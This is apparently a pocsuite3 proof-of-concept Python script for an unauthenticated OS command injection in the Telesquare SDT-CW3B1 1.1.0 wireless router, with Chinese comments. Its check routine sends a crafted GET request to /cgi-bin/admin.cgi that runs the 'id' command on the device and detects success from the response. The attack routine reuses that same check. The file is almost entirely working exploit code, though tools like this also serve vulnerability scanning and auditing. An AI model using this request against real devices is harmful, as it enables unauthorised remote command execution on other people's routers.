from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class SCrcePOC(POCBase):
    vulID = "1571"  # ssvid 
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-04-27"  # 漏洞公开的时间
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间
    references = ["https://www.exploit-db.com/exploits/50948"]  # 漏洞地址来源
    name = "Telesquare SDT-CW3B1   rce 远程命令PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "SDT-CW3B1"  # 漏洞应用名称
    appVersion = "1.1.0"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               Telesquare SDT-CW3B1是韩国Telesquare公司的一款无线路由器。
            Telesquare SDT-CW3B1 1.1.0 版本存在安全漏洞，该漏洞源于操作系统命令注入。远程攻击者利用此漏洞无需任何身份验证即可执行操作系统命令。
           """  # 漏洞简要描述
    pocDesc = """
               poc的用法描述
           """  # POC用法描述

    def _check(self):

        full_url = f"{self.url}/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        result = []
        try:
            response = requests.get(full_url, headers=headers, verify=False, timeout=5, allow_redirects=False)

            if response.status_code == 200 and "<CmdResult>" in response.text:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result


    def _verify(self):
        result = {}
        res = self._check()  
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(SCrcePOC)
